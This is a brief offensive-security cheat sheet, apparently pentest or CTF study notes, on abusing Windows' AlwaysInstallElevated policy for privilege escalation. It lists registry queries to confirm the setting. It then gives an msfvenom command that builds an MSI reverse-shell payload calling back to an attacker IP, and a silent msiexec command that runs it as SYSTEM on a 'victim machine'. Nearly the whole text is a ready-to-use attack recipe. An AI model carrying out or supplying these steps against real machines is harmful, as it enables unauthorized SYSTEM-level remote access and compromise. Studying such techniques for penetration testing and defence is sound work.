AlwaysInstallElevated is a functionality which allows sys admins to install program as SYSTEM.
As an attacker we can abuse this functionalities if it is enabled.
We can enumerate it with below commands:

-- reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-- reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

* If both values are set to 1 AlwaysInstallElevated is enabled.

** Can abuse it with following way:

[ Create a msi reverse shell with following command. ]

-- msfvenom -p windows/shell_reverse_tcp lhost=IP lport=80 -f msi -o shell.msi

Then transfer it to victim machine. After transferring use below command to execute it as a SYSTEM. (Do not forget to listen on specified port in reverse shell.)

-- msiexec /quiet /q /n /i shell.msi
